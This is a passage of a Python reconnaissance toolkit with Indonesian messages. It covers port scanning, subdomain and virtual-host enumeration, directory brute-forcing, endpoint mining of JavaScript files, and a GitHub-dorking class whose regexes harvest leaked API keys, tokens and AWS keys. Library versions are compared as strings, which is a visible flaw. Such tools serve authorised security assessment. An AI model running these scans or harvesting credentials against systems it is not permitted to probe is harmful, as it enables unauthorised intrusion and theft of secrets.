                        except:
                            result["banner"] = ""

                        result["status"] = "open"
                        common_services = {
                            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
                            3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis", 27017: "MongoDB",
                            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP", 11211: "Memcached"
                        }
                        result["service_guess"] = common_services.get(port, "Unknown")

                        print(f"{H}[✓] Port {port} terbuka - {result['service_guess']} | Banner: {banner[:60]}{RESET}")

                except socket.timeout:
                    print(f"{K}[-] Port {port} timeout.{RESET}")
                except Exception as e:
                    print(f"{M}[x] Port {port} tertutup/diblokir: {e}{RESET}")
                return result

            from concurrent.futures import ThreadPoolExecutor

            print(f"{C}[*] Melakukan parallel scan menggunakan thread ...{RESET}")
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = [executor.submit(scan, port) for port in ports]
                for f in futures:
                    hasil = f.result()
                    if hasil["status"] == "open":
                        hasil_scan.append(hasil)

            if hasil_scan:
                LOGS.append({
                    "port_scan_deep": {
                        "ip": ip,
                        "ports_open": hasil_scan,
                        "total_open": len(hasil_scan)
                    }
                })
                print(f"{H}[✓] Total port terbuka: {len(hasil_scan)}{RESET}")
            else:
                LOGS.append({
                    "port_scan_deep": {
                        "ip": ip,
                        "ports_open": [],
                        "total_open": 0
                    }
                })
                print(f"{K}[~] Tidak ada port terbuka terdeteksi dari daftar target.{RESET}")

        except Exception as e:
            print(f"{M}[!] siPortManja: Gagal melakukan scanning: {e}{RESET}")

class siTlsSantuy:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siTlsSantuy: Mengambil dan menganalisis data TLS dari CertSpotter untuk {domain} ...{RESET}")
            url = f"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names"
            r = requests.get(url, timeout=20)
            certs = r.json()

            if not certs:
                print(f"{K}[~] Tidak ada sertifikat TLS ditemukan dari API.{RESET}")
                LOGS.append({"tls_certspotter": []})
                return

            parsed = []
            issuer_stat = {}
            wildcard_count = 0
            expired_count = 0
            active_count = 0
            internal_subs = []

            for cert in certs:
                issuer = cert.get("issuer", {}).get("common_name", "Unknown")
                dns_names = cert.get("dns_names", [])
                not_before = cert.get("not_before", "")
                not_after = cert.get("not_after", "")
                cert_url = cert.get("certificate", "")

                try:
                    exp = datetime.strptime(not_after, "%Y-%m-%dT%H:%M:%SZ")
                    expired = exp < datetime.utcnow()
                except:
                    expired = "unknown"

                for name in dns_names:
                    if "*" in name:
                        wildcard_count += 1
                    if name.startswith("internal.") or "local" in name:
                        internal_subs.append(name)

                issuer_stat[issuer] = issuer_stat.get(issuer, 0) + 1

                if expired == True:
                    expired_count += 1
                elif expired == False:
                    active_count += 1

                parsed.append({
                    "issuer": issuer,
                    "dns_names": dns_names,
                    "not_before": not_before,
                    "not_after": not_after,
                    "expired": expired,
                    "cert_url": cert_url
                })

            LOGS.append({"tls_certspotter": parsed})

            print(f"{H}[✓] TLS berhasil diambil: {len(parsed)} sertifikat ditemukan!{RESET}")
            print(f"{B}    ↳ Aktif     : {active_count}{RESET}")
            print(f"{K}    ↳ Expired   : {expired_count}{RESET}")
            print(f"{C}    ↳ Wildcards : {wildcard_count}{RESET}")
            if internal_subs:
                print(f"{M}    ↳ Subdomain Internal Terdeteksi! ({len(internal_subs)}){RESET}")
                for sub in internal_subs[:5]:
                    print(f"        - {sub}")

            top_issuer = max(issuer_stat.items(), key=lambda x: x[1])[0]
            print(f"{H}    ↪ Penerbit Sertifikat Terpopuler: {top_issuer} ({issuer_stat[top_issuer]}x){RESET}")

            print(f"{C}┌─ Contoh detail sertifikat pertama:{RESET}")
            contoh = parsed[0]
            for name in contoh['dns_names'][:5]:
                print(f"{W}│  ↳ {name}{RESET}")
            print(f"{C}└─ Issuer     : {contoh['issuer']}{RESET}")
            print(f"   🔐 Valid    : {contoh['not_before']} → {contoh['not_after']}")
            print(f"   ❓ Expired  : {contoh['expired']}")
            print(f"   🔗 URL Cert : {contoh['cert_url'][:60]}...")

        except Exception as e:
            print(f"{M}[!] siTlsSantuy: Gagal memproses data TLS - {e}{RESET}")
                
class siGithubDorking:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siGithubDorking: Mencari kemungkinan kebocoran data sensitif di GitHub untuk domain: {domain}{RESET}")
            keywords = [
                f'"{domain}" AND (password OR secret OR api_key OR token)',
                f'"{domain}" AND (leak OR exposed OR credential)',
                f'"{domain}" AND (config OR .env OR database)',
                f'"{domain}" AND (auth OR oauth OR access_key)'
            ]

            headers = HEADERS()
            headers.update({
                "Accept": "text/html,application/xhtml+xml",
                "Referer": "https://github.com/",
                "Host": "github.com"
            })

            total_samples = []
            score_mapping = {
                "api_key": r"(api[_-]?key\s*[:=]\s*[\'\"]?[a-zA-Z0-9_\-]{16,})",
                "access_token": r"(access[_-]?token\s*[:=]\s*[\'\"]?[a-zA-Z0-9_\-]{16,})",
                "aws_key": r"(AKIA[0-9A-Z]{16})",
                "email": r"[\w\.-]+@[\w\.-]+\.\w+"
            }

            for q in keywords:
                encoded = quote(q)
                search_url = f"https://github.com/search?q={encoded}&type=Code"
                print(f"{C}    [+] Query: {q}{RESET}")
                print(f"{W}      → {search_url}{RESET}")

                try:
                    r = requests.get(search_url, headers=headers, timeout=15)
                    if r.status_code == 200:
                        titles = re.findall(r'<a class="v-align-middle" href="(.*?)">', r.text)
                        titles = list(set(titles))[:5]
                        leaks = []

                        for path in titles:
                            full_url = f"https://github.com{path}"
                            try:
                                resp = requests.get(full_url, headers=headers, timeout=10)
                                matches = []
                                for label, pattern in score_mapping.items():
                                    hits = re.findall(pattern, resp.text, re.IGNORECASE)
                                    if hits:
                                        matches.append({label: hits[:3]})
                                if matches:
                                    leaks.append({
                                        "url": full_url,
                                        "sensitive": matches
                                    })
                            except:
                                continue

                        total_samples.append({
                            "query": q,
                            "link": search_url,
                            "result_raw": titles,
                            "leak_details": leaks
                        })

                        if leaks:
                            print(f"{H}        [✓] Ditemukan indikasi kebocoran sensitif dari hasil GitHub!{RESET}")
                            for leak in leaks:
                                print(f"{K}            → {leak['url']}{RESET}")
                                for s in leak['sensitive']:
                                    for key, val in s.items():
                                        for v in val:
                                            print(f"{C}              ↳ {key}: {v.strip()}{RESET}")
                        else:
                            print(f"{K}        [~] Tidak ditemukan pola sensitif dalam hasil.{RESET}")

                    else:
                        print(f"{M}        [!] GitHub tidak merespons dengan baik. Status: {r.status_code}{RESET}")

                except Exception as e:
                    print(f"{M}        [!] Error saat mengakses GitHub: {e}{RESET}")

            LOGS.append({"github_dorking_extended": total_samples})

        except Exception as e:
            print(f"{M}[!] siGithubDorking: Terjadi kesalahan fatal - {e}{RESET}")
            
class siEmailLeakHunter:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siEmailLeakHunter: Mendeteksi kemungkinan kebocoran email dari domain {domain}{RESET}")
            
            kandidat_prefix = ["admin", "support", "info", "ceo", "root", "help", "contact", "dev", "team", "marketing", "billing", "hr"]
            kandidat_email = [f"{prefix}@{domain}" for prefix in kandidat_prefix]
            
            whois_log = next((x for x in LOGS if "whois_detail" in x), None)
            if whois_log:
                wh_email = whois_log["whois_detail"].get("email", "")
                if isinstance(wh_email, str) and wh_email.endswith(domain) and wh_email not in kandidat_email:
                    kandidat_email.append(wh_email.strip())
                    print(f"{K}[i] Ditemukan email dari WHOIS: {wh_email}{RESET}")
                elif isinstance(wh_email, list):
                    for w in wh_email:
                        if w.endswith(domain) and w not in kandidat_email:
                            kandidat_email.append(w.strip())
                            print(f"{K}[i] Ditemukan email dari WHOIS: {w}{RESET}")

            hasil_bocor = []
            rate_limited = 0
            total_checked = 0

            for email in sorted(set(kandidat_email)):
                url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "hibp-api-key": "YOUR_API_KEY_HERE"  # Ganti dengan API Key pribadi jika perlu
                }

                print(f"{C}    ↪ Mengecek: {email}{RESET}")
                try:
                    r = requests.get(url, headers=headers, timeout=10)
                    total_checked += 1

                    if r.status_code == 200:
                        print(f"{M}[!] Bocor: {email}{RESET}")
                        hasil_bocor.append(email)
                    elif r.status_code == 404:
                        print(f"{H}[✓] Aman: {email} belum pernah bocor{RESET}")
                    elif r.status_code == 429:
                        print(f"{K}[!] Rate Limit - Menunggu 2 detik...{RESET}")
                        rate_limited += 1
                        time.sleep(2)
                        continue
                    else:
                        print(f"{K}[~] Tidak bisa cek {email} - Status: {r.status_code}{RESET}")
                except Exception as err:
                    print(f"{M}[!] Gagal cek {email} → {err}{RESET}")
                    continue

            hasil = {
                "domain": domain,
                "total_checked": total_checked,
                "total_bocor": len(hasil_bocor),
                "emails_bocor": hasil_bocor,
                "rate_limit_terjadi": rate_limited
            }

            LOGS.append({"leak_email": hasil})

            print(f"{B}[*] Ringkasan:{RESET}")
            print(f"{H}    ↪ Email dicek      : {total_checked}{RESET}")
            print(f"{M}    ↪ Email bocor      : {len(hasil_bocor)}{RESET}")
            print(f"{K}    ↪ Terkena rateLimit: {rate_limited} kali{RESET}")

            if hasil_bocor:
                print(f"{C}    ↪ Daftar email bocor:")
                for e in hasil_bocor:
                    print(f"{W}       → {e}{RESET}")
            else:
                print(f"{H}    ↪ Tidak ada email bocor terdeteksi dari pola yang diuji.{RESET}")

        except Exception as e:
            print(f"{M}[!] siEmailLeakHunter: Error utama saat pengecekan - {e}{RESET}")
                
class siSubfinder:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siSubfinder: Mengambil subdomain publik dari CRT.sh untuk domain: {domain}{RESET}")
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            headers = {
                "User-Agent": random.choice(USER_AGENTS)
            }

            r = requests.get(url, headers=headers, timeout=12)
            hasil = json.loads(r.text)

            semua_sub = set()
            sumber_sub = {}  # {subdomain: [issuer]}

            for entry in hasil:
                nama = entry.get("name_value", "")
                issuer = entry.get("issuer_name", "Unknown")
                for sub in nama.splitlines():
                    sub = sub.strip().lower()
                    if "*" in sub or not sub.endswith(domain): continue
                    semua_sub.add(sub)
                    sumber_sub.setdefault(sub, []).append(issuer)

            semua_sub = sorted(semua_sub)
            resolved = []
            unresolved = []

            print(f"{B}[*] Validasi DNS: Mengecek apakah subdomain dapat di-resolve...{RESET}")
            for sub in semua_sub:
                try:
                    ip = socket.gethostbyname(sub)
                    resolved.append((sub, ip))
                    print(f"{H}    [✓] {sub} → {ip}{RESET}")
                except:
                    unresolved.append(sub)
                    print(f"{K}    [~] {sub} → Tidak dapat di-resolve{RESET}")

            hasil_final = {
                "total": len(semua_sub),
                "aktif": len(resolved),
                "mati": len(unresolved),
                "resolved": resolved,
                "unresolved": unresolved,
                "sumber": sumber_sub
            }

            LOGS.append({"crtsh_subs": hasil_final})

            print(f"{B}[*] Ringkasan CRT.sh Subdomain Discovery:{RESET}")
            print(f"{H}    ↪ Total ditemukan   : {len(semua_sub)}{RESET}")
            print(f"{H}    ↪ Resolved aktif    : {len(resolved)}{RESET}")
            print(f"{K}    ↪ Tidak resolve     : {len(unresolved)}{RESET}")
            if resolved:
                print(f"{C}    Contoh aktif:{RESET}")
                for sub, ip in resolved[:10]:
                    print(f"{B}      → {sub} → {ip}{RESET}")

        except requests.exceptions.RequestException as req_err:
            print(f"{M}[!] siSubfinder: Gagal permintaan HTTP - {req_err}{RESET}")
        except json.decoder.JSONDecodeError as json_err:
            print(f"{M}[!] siSubfinder: Format JSON dari CRT.sh tidak valid - {json_err}{RESET}")
        except Exception as e:
            print(f"{M}[!] siSubfinder: Kesalahan fatal saat parsing - {e}{RESET}")
                
class siJsDepFinger:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siJsDepFinger: Melakukan fingerprinting library JS di domain: {domain}{RESET}")

            js_urls = [f"https://{domain}/{w}" for w in WORDLIST if w.endswith('.js')]
            lib_patterns = {
                "jquery": r"jquery(?:\.min)?[-.]?v?([0-9.]+)",
                "angular": r"angular(?:\.min)?[-.]?v?([0-9.]+)",
                "bootstrap": r"bootstrap(?:\.min)?[-.]?v?([0-9.]+)",
                "react": r"react(?:\.min)?[-.]?v?([0-9.]+)",
                "vue": r"vue(?:\.min)?[-.]?v?([0-9.]+)",
                "lodash": r"lodash(?:\.min)?[-.]?v?([0-9.]+)"
            }

            latest_versions = {
                "jquery": "3.6.0",
                "angular": "11.0.0",
                "bootstrap": "4.6.0",
                "react": "17.0.2",
                "vue": "3.2.0",
                "lodash": "4.17.21"
            }

            hasil_deteksi = []
            for js_url in js_urls:
                try:
                    r = requests.get(js_url, headers=HEADERS(), timeout=6)
                    content = r.text

                    for lib, pattern in lib_patterns.items():
                        versi = None

                        if re.search(lib, js_url.lower()):
                            versi_url = re.search(pattern, js_url.lower())
                            versi = versi_url.group(1) if versi_url else None
                        if not versi:
                            versi_match = re.search(pattern, content, re.IGNORECASE)
                            versi = versi_match.group(1) if versi_match else None

                        if versi:
                            outdated = versi < latest_versions[lib]
                            hasil_deteksi.append({
                                "library": lib,
                                "detected_version": versi,
                                "latest_version": latest_versions[lib],
                                "source": js_url,
                                "outdated": outdated
                            })

                            status = f"{M}[!] Outdated" if outdated else f"{H}[✓] Up-to-date"
                            print(f"{status}{RESET} → {lib} v{versi} ditemukan di {js_url}")
                except Exception as e:
                    print(f"{K}[~] Gagal fetch atau parsing {js_url} → {e}{RESET}")
                    continue

            if hasil_deteksi:
                tabel = []
                for entry in hasil_deteksi:
                    tanda = f"{M}✘{RESET}" if entry['outdated'] else f"{H}✔{RESET}"
                    print(f"{B}    ▸ {entry['library']} {entry['detected_version']} {K}(latest: {entry['latest_version']}){RESET} {tanda}")
                    print(f"{C}      ↳ Source: {entry['source']}{RESET}")

                LOGS.append({"js_lib_audit": hasil_deteksi})
            else:
                print(f"{H}[✓] Tidak ditemukan library JS yang outdated atau fingerprintable pada {domain}{RESET}")
                LOGS.append({"js_lib_audit": "No outdated libs found"})

        except Exception as e:
            print(f"{M}[!] siJsDepFinger: Error fatal saat fingerprinting JS - {e}{RESET}")
                
class siAsnMaper:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siAsnMaper: Mengambil informasi ASN dan detail IP publik untuk {domain}{RESET}")
            ip = socket.gethostbyname(domain)
            print(f"{B}[i] IP Resolusi: {ip}{RESET}")

            info = {
                "ip": ip,
                "asn": None,
                "isp": None,
                "rir": None,
                "country": None,
                "location": None,
                "source": [],
                "prefix": None
            }
            try:
                print(f"{C}[*] Coba via HackerTarget...{RESET}")
                r = requests.get(f"https://api.hackertarget.com/aslookup/?q={ip}", timeout=10)
                hasil = r.text.strip()
                if hasil and "AS" in hasil and "," in hasil:
                    lines = hasil.splitlines()
                    for line in lines:
                        parts = line.split(",")
                        if len(parts) >= 5:
                            info["asn"] = parts[0].strip()
                            info["isp"] = parts[1].strip()
                            info["prefix"] = parts[2].strip()
                            info["country"] = parts[3].strip()
                            info["rir"] = parts[4].strip()
                            info["source"].append("hackertarget.com")
                            print(f"{H}[✓] ASN Info dari HackerTarget berhasil ditemukan!{RESET}")
                            break
                else:
                    print(f"{K}[~] Tidak ditemukan data valid dari HackerTarget{RESET}")
            except Exception as e:
                print(f"{M}[!] Gagal ambil dari HackerTarget - {e}{RESET}")
            if not info["asn"]:
                try:
                    print(f"{C}[*] Coba fallback via ipinfo.io...{RESET}")
                    r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
                    res = r.json()
                    info["asn"] = res.get("org", "Unknown")
                    info["isp"] = res.get("org", "Unknown")
                    info["country"] = res.get("country", "Unknown")
                    info["location"] = res.get("city", "Unknown") + ", " + res.get("region", "Unknown")
                    info["prefix"] = res.get("loc", "Unknown")
                    info["source"].append("ipinfo.io")
                    print(f"{H}[✓] Data ASN berhasil didapat dari ipinfo.io{RESET}")
                except Exception as e:
                    print(f"{M}[!] Gagal ambil dari ipinfo.io - {e}{RESET}")
            if not info["asn"]:
                try:
                    import dns.resolver
                    reversed_ip = ".".join(ip.split(".")[::-1])
                    query = f"{reversed_ip}.origin.asn.cymru.com"
                    print(f"{C}[*] Fallback DNS Query ke Team Cymru: {query}{RESET}")
                    answer = dns.resolver.resolve(query, "TXT")
                    if answer:
                        txt = str(answer[0]).strip('"')
                        fields = txt.split("|")
                        if len(fields) >= 5:
                            info["asn"] = fields[0].strip()
                            info["prefix"] = fields[1].strip()
                            info["country"] = fields[2].strip()
                            info["rir"] = fields[3].strip()
                            info["isp"] = fields[4].strip()
                            info["source"].append("team-cymru-dns")
                            print(f"{H}[✓] ASN ditemukan melalui Team Cymru DNS lookup!{RESET}")
                except Exception as e:
                    print(f"{K}[~] Fallback Team Cymru gagal - {e}{RESET}")

            if info["asn"]:
                LOGS.append({"asn_detail": info})
                print(f"{B}┌─ Info ASN untuk {domain}:{RESET}")
                print(f"{B}│  ASN     : {RESET}{info['asn']}")
                print(f"{B}│  ISP     : {RESET}{info['isp']}")
                print(f"{B}│  Prefix  : {RESET}{info['prefix']}")
                print(f"{B}│  Negara  : {RESET}{info['country']}")
                if info['location']: print(f"{B}│  Lokasi  : {RESET}{info['location']}")
                print(f"{B}│  RIR     : {RESET}{info['rir']}")
                print(f"{B}└─ Source  : {RESET}{', '.join(info['source'])}")
            else:
                print(f"{M}[!] Gagal mendapatkan informasi ASN dari semua sumber!{RESET}")
                LOGS.append({"asn_detail": {"ip": ip, "error": "No ASN info found"}})

        except Exception as e:
            print(f"{M}[!] siAsnMaper: Terjadi error utama - {e}{RESET}")
                
class siWaybackPeeker:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siWaybackPeeker: Menganalisis snapshot arsip Wayback Machine untuk: {domain}{RESET}")
            url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&collapse=urlkey"
            r = requests.get(url, timeout=12)
            hasil = r.json()

            if not hasil or len(hasil) < 2:
                print(f"{K}[~] Tidak ada arsip ditemukan di Wayback Machine untuk {domain}{RESET}")
                LOGS.append({"wayback": "tidak ditemukan arsip valid"})
                return

            print(f"{H}[✓] Total {len(hasil)-1} snapshot arsip ditemukan! Menganalisis data...{RESET}")
            arsip = hasil[1:]

            timeline = {}
            mime_counter = {}
            status_counter = {}
            snapshot_list = []
            domain_found = set()

            for snap in arsip:
                if len(snap) < 7:
                    continue

                timestamp, original, mime, status = snap[1], snap[2], snap[3], snap[4]
                year = timestamp[:4]
                timeline[year] = timeline.get(year, 0) + 1
                mime_counter[mime] = mime_counter.get(mime, 0) + 1
                status_counter[status] = status_counter.get(status, 0) + 1
                wayback_url = f"http://web.archive.org/web/{timestamp}/{original}"
                snapshot_list.append({
                    "timestamp": timestamp,
                    "original": original,
                    "url": wayback_url,
                    "mime": mime,
                    "status": status
                })

                try:
                    parsed = original.split("/")[2]
                    if parsed.endswith(domain):
                        domain_found.add(parsed)
                except:
                    continue
            print(f"{C}[*] Ringkasan Timeline Snapshot:{RESET}")
            for year, count in sorted(timeline.items()):
                print(f"{B}    {year}: {count} arsip{RESET}")

            print(f"{C}[*] MIME Types terdeteksi:{RESET}")
            for mime, total in sorted(mime_counter.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"{K}    {mime}: {total}{RESET}")

            print(f"{C}[*] HTTP Status distribusi:{RESET}")
            for code, count in sorted(status_counter.items(), key=lambda x: x[1], reverse=True):
                print(f"{W}    {code}: {count} snapshot{RESET}")

            print(f"{C}[*] Subdomain unik dari arsip:{RESET}")
            for sub in sorted(domain_found):
                print(f"{B}    ↳ {sub}{RESET}")

            print(f"{H}[✓] Contoh Snapshot Awal dan Akhir:{RESET}")
            print(f"{B}    ⏳ Pertama : {snapshot_list[0]['timestamp']} → {snapshot_list[0]['url']}{RESET}")
            print(f"{B}    ⌛ Terakhir: {snapshot_list[-1]['timestamp']} → {snapshot_list[-1]['url']}{RESET}")

            LOGS.append({
                "wayback_analysis": {
                    "total_snapshot": len(snapshot_list),
                    "timeline": timeline,
                    "mimetypes": mime_counter,
                    "status_codes": status_counter,
                    "unique_domains": list(domain_found),
                    "sample_first": snapshot_list[0],
                    "sample_last": snapshot_list[-1],
                    "top_5": snapshot_list[:5]
                }
            })

        except Exception as e:
            print(f"{M}[!] siWaybackPeeker: Gagal mengambil atau memproses data Wayback Machine - {e}{RESET}")
            
class siJsEndpointHunter:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siJsEndpointHunter: Memindai endpoint dari file JavaScript di domain: {domain}{RESET}")
            hasil_final = {}
            sensitive_hits = {}
            internal_endpoints = set()
            external_endpoints = set()
            endpoint_keywords = ["login", "auth", "token", "upload", "admin", "api", "config"]
            total_endpoint = 0

            for js in WORDLIST:
                if not js.endswith(".js"):
                    continue

                url = f"https://{domain}/{js}"
                try:
                    print(f"{C}  [+] Mengakses: {url}{RESET}")
                    r = requests.get(url, timeout=6)
                    if r.status_code != 200 or not r.text.strip():
                        print(f"{K}    [~] Lewatkan: file tidak valid atau kosong{RESET}")
                        continue

                    endpoints = re.findall(r"""(?i)(https?:\/\/[^\s"'<>]+)""", r.text)
                    cleaned = list(set([ep.strip().rstrip("/") for ep in endpoints if domain in ep or any(p in ep for p in endpoint_keywords)]))

                    if cleaned:
                        hasil_final[url] = cleaned
                        total_endpoint += len(cleaned)

                        print(f"{H}    [✓] Ditemukan {len(cleaned)} endpoint dari JS ini{RESET}")

                        for ep in cleaned[:5]:
                            print(f"{B}       ➤ {ep}{RESET}")

                        for ep in cleaned:
                            if domain in ep:
                                internal_endpoints.add(ep)
                            else:
                                external_endpoints.add(ep)

                            for key in endpoint_keywords:
                                if key in ep.lower():
                                    sensitive_hits.setdefault(key, []).append(ep)

                except Exception as e:
                    print(f"{M}[!] Gagal mengambil JS: {url} - {e}{RESET}")
                    continue

            if hasil_final:
                print(f"{H}[✓] Total endpoint ditemukan: {total_endpoint}{RESET}")
                print(f"{C}    ↳ Internal : {len(internal_endpoints)} | External : {len(external_endpoints)}{RESET}")

                if sensitive_hits:
                    print(f"{M}[!] Endpoint sensitif yang terdeteksi berdasarkan kata kunci:{RESET}")
                    for k, eps in sensitive_hits.items():
                        print(f"{K}     {k} → {len(eps)} endpoint")
                        for ep in eps[:3]:
                            print(f"{W}        → {ep}{RESET}")
                else:
                    print(f"{H}[✓] Tidak ada endpoint dengan keyword sensitif terdeteksi{RESET}")

                LOGS.append({
                    "js_endpoint_hunter": {
                        "total_found": total_endpoint,
                        "files_scanned": list(hasil_final.keys()),
                        "internal": list(internal_endpoints),
                        "external": list(external_endpoints),
                        "by_file": hasil_final,
                        "sensitive": sensitive_hits
                    }
                })
            else:
                print(f"{K}[~] Tidak ditemukan endpoint dalam file JS yang dianalisis{RESET}")
                LOGS.append({
                    "js_endpoint_hunter": {
                        "total_found": 0,
                        "message": "Tidak ditemukan endpoint dari JS apapun"
                    }
                })

        except Exception as e:
            print(f"{M}[!] siJsEndpointHunter: Kesalahan fatal saat pemindaian endpoint - {e}{RESET}")
            
class siDirForce:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siDirForce: Melakukan brute-force direktori pada domain: {domain}{RESET}")
            hasil = {
                "200_OK": [],
                "403_Forbidden": [],
                "401_Unauthorized": [],
                "3xx_Redirect": [],
                "500_Error": [],
                "Timeout_or_Fail": [],
                "Slow_Response": [],
                "Redirect_to_Login": []
            }

            redirect_keywords = ["login", "signin", "auth", "account"]
            slow_threshold = 3  # detik
            total_tested = 0

            for w in WORDLIST:
                url = f"https://{domain}/{w}"
                try:
                    start = time.time()
                    r = requests.get(url, timeout=8, allow_redirects=False)
                    elapsed = time.time() - start
                    total_tested += 1

                    status = r.status_code

                    if status == 200:
                        hasil["200_OK"].append(url)
                        print(f"{H}[✓] 200 OK ➤ {url}{RESET}")

                    elif status == 403:
                        hasil["403_Forbidden"].append(url)
                        print(f"{K}[×] 403 Forbidden ➤ {url}{RESET}")

                    elif status == 401:
                        hasil["401_Unauthorized"].append(url)
                        print(f"{M}[×] 401 Unauthorized ➤ {url}{RESET}")

                    elif str(status).startswith("3"):
                        hasil["3xx_Redirect"].append(url)
                        lokasi = r.headers.get("Location", "")
                        is_login = any(k in lokasi.lower() for k in redirect_keywords)
                        if is_login:
                            hasil["Redirect_to_Login"].append(url)
                            print(f"{B}[→] Redirect ke login ➤ {url} → {lokasi}{RESET}")
                        else:
                            print(f"{B}[→] {status} Redirect ➤ {url}{RESET}")

                    elif status >= 500:
                        hasil["500_Error"].append(url)
                        print(f"{M}[!] {status} Server Error ➤ {url}{RESET}")

                    if elapsed > slow_threshold:
                        hasil["Slow_Response"].append((url, round(elapsed, 2)))
                        print(f"{K}[~] Respons lambat ({elapsed:.2f}s) ➤ {url}{RESET}")

                except requests.exceptions.Timeout:
                    hasil["Timeout_or_Fail"].append(url)
                    print(f"{K}[~] Timeout mengakses {url}{RESET}")
                except Exception as e:
                    hasil["Timeout_or_Fail"].append(url)
                    print(f"{M}[!] Error saat akses {url} → {e}{RESET}")

            LOGS.append({
                "dir_force": {
                    "target": domain,
                    "tested": total_tested,
                    "result": hasil
                }
            })

            print(f"{C}\n[•] Ringkasan Hasil DirForce untuk {domain}:{RESET}")
            for k, v in hasil.items():
                count = len(v) if isinstance(v, list) else len(v)
                warna = H if count > 0 else K
                print(f"{warna}    {k:<20}: {count}{RESET}")

            if hasil["200_OK"]:
                print(f"{C}    ➤ Contoh direktori aktif:{RESET}")
                for d in hasil["200_OK"][:5]:
                    print(f"{B}       - {d}{RESET}")

        except Exception as e:
            print(f"{M}[!] siDirForce: Kesalahan utama saat brute-force direktori - {e}{RESET}")
            
class siVHostFinder:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siVHostFinder: Mendeteksi Virtual Host (VHost) untuk domain: {domain}{RESET}")
            ip_target = socket.gethostbyname(domain)
            print(f"{B}[i] IP utama domain: {ip_target}{RESET}")

            subpatterns = [
                "test", "dev", "admin", "api", "staging", "uat", "vpn",
                "internal", "preprod", "debug", "backend", "portal",
                "cpanel", "dashboard", "vhost", "beta", "old", "bkp", "web1", "web2", "db"
            ]

            vhosts_aktif = []
            vhosts_gagal = []
            ip_internal = []

            for sub in subpatterns:
                vhost = f"{sub}.{domain}"
                try:
                    resolved_ip = socket.gethostbyname(vhost)
                    if re.match(r"^(127\.|10\.|172\.1[6-9]|172\.2[0-9]|172\.3[0-1]|192\.168\.)", resolved_ip):
                        print(f"{M}[!] INTERNAL IP Terdeteksi ➤ {vhost} → {resolved_ip}{RESET}")
                        ip_internal.append((vhost, resolved_ip))
                    else:
                        print(f"{H}[✓] VHost AKTIF ➤ {vhost} → {resolved_ip}{RESET}")
                        vhosts_aktif.append((vhost, resolved_ip))
                        try:
                            res = requests.head(f"http://{vhost}", headers={"Host": vhost}, timeout=5, allow_redirects=True)
                            print(f"{B}    ↪ HEAD Status: {res.status_code} | Server: {res.headers.get('Server', 'Unknown')}{RESET}")
                        except:
                            print(f"{K}    ↪ Tidak dapat melakukan HTTP HEAD ke {vhost}{RESET}")

                except socket.gaierror:
                    print(f"{K}[×] VHost TIDAK aktif ➤ {vhost}{RESET}")
                    vhosts_gagal.append(vhost)
                except Exception as err:
                    print(f"{M}[!] Error saat resolve {vhost}: {err}{RESET}")
                    continue

            wildcard_dns = False
            if len(set(ip for _, ip in vhosts_aktif)) == 1 and len(vhosts_aktif) > 10:
                wildcard_dns = True
                print(f"{M}[!] Indikasi Wildcard DNS terdeteksi: Semua VHost resolve ke IP yang sama!{RESET}")
            summary = {
                "domain": domain,
                "wildcard_dns": wildcard_dns,
                "vhosts_aktif": vhosts_aktif,
                "vhosts_internal": ip_internal,
                "vhosts_gagal": vhosts_gagal
            }

            LOGS.append({"vhost_extended": summary})

            print(f"{C}\n[•] Ringkasan VHost:{RESET}")
            print(f"{H}    ➤ Total aktif       : {len(vhosts_aktif)}{RESET}")
            print(f"{M}    ➤ Internal IP       : {len(ip_internal)}{RESET}")
            print(f"{K}    ➤ Gagal resolve     : {len(vhosts_gagal)}{RESET}")
            print(f"{B}    ➤ Wildcard detected : {wildcard_dns}{RESET}")

            if vhosts_aktif:
                print(f"{C}    ➤ Contoh aktif:{RESET}")
                for v, ip in vhosts_aktif[:5]:
                    print(f"{B}        {v} → {ip}{RESET}")

        except Exception as e:
            print(f"{M}[!] siVHostFinder: Gagal mendeteksi Virtual Host - {e}{RESET}")
            
class siSpfDkim:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siSpfDkim: Menganalisis konfigurasi email authentication (SPF, DKIM, DMARC) untuk: {domain}{RESET}")
            hasil = {
                "SPF": None,
                "DKIM": [],
                "DMARC": None,
                "issues": []
            }

            try:
                spf_records = resolver.resolve(domain, "TXT")
                for r in spf_records:
                    r_text = str(r).strip(' "')
                    if r_text.startswith("v=spf1"):
                        hasil["SPF"] = r_text
                        LOGS.append({"SPF": r_text})
                        print(f"{H}[✓] SPF ditemukan: {r_text}{RESET}")

                        if "~all" in r_text:
                            hasil["issues"].append("SPF: SoftFail (~all) digunakan → memungkinkan spoofing")
                        elif "-all" not in r_text:
                            hasil["issues"].append("SPF: Tidak ada hardfail (-all) → SPF lemah")
                        break
                else:
                    print(f"{K}[~] Tidak ditemukan SPF record.{RESET}")
            except Exception as e:
                print(f"{M}[!] Gagal resolve SPF: {e}{RESET}")
            try:
                dmarc_domain = f"_dmarc.{domain}"
                dmarc_records = resolver.resolve(dmarc_domain, "TXT")
                for r in dmarc_records:
                    r_text = str(r).strip(' "')
                    if r_text.startswith("v=DMARC1"):
                        hasil["DMARC"] = r_text
                        LOGS.append({"DMARC": r_text})
                        print(f"{H}[✓] DMARC ditemukan: {r_text}{RESET}")

                        # Evaluasi policy
                        if "p=none" in r_text:
